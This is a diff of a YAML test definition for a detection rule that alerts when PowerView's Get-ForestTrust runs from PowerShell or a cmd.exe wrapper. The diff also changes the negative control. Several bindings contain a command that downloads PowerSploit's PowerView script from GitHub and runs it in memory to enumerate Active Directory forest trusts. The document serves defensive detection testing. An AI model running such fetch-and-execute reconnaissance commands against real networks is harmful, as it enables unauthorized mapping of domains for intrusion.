@@ -8,7 +8,8 @@ description: |
   Validates detection of PowerView's Get-ForestTrust being run to enumerate
   the trusts leaving the current forest, which maps where a compromised
   account can reach beyond its own domain. Both shells the rule scopes to
-  are covered; the control runs a cmd.exe shell with no forest-trust call.
+  are covered. The control is the same PowerShell shell running a toolkit
+  sibling the rule does not name, so it differs only on the command line.
 
 mitre:
   tactics: [discovery]
@@ -24,8 +25,8 @@ state:
 workloads:
   - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
     bindings:
-      computer:     ref.computer
-      command_line: "powershell.exe  -C \"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust\""
+      computer:   ref.computer
+      shell_args: "-C \"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust\""
     expectation:
       expected: alert
       summary: "powershell.exe loads PowerView and calls Get-ForestTrust"
@@ -36,12 +37,13 @@ workloads:
   - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
     bindings:
       computer:            ref.computer
-      command_line:        "cmd.exe  /c powershell.exe -C \"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust\""
       image:               "C:\\Windows\\System32\\cmd.exe"
       original_file_name:  Cmd.Exe
       host_description:    Windows Command Processor
       file_version:        10.0.14393.0 (rs1_release.160715-1616)
       file_hash:           "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A"
+      command_line:        "cmd.exe  /c powershell.exe -C \"IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust\""
+      parent_command_line: 'C:\Windows\system32\cmd.exe /c ""C:\Users\Administrator\Desktop\kaboom.bat" "'
     expectation:
       expected: alert
       summary: "The cmd.exe wrapper carries the forest-trust call on its own command line"
@@ -51,13 +53,8 @@ workloads:
 
   - scenario: scenarios/windows/sysmon/process-create/shell-ad-discovery-cmdlet
     bindings:
-      computer:            ref.computer
-      command_line:        "cmd.exe  /c powershell.exe Get-DomainSID"
-      image:               "C:\\Windows\\System32\\cmd.exe"
-      original_file_name:  Cmd.Exe
-      host_description:    Windows Command Processor
-      file_version:        10.0.14393.0 (rs1_release.160715-1616)
-      file_hash:           "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2,IMPHASH=3062ED732D4B25D1C64F084DAC97D37A"
+      computer: ref.computer
+      cmdlet:   Get-DomainSID
     expectation:
       expected: none
-      summary: "A cmd.exe shell with no forest-trust call"
+      summary: "The same shell runs a toolkit sibling with no forest-trust call"
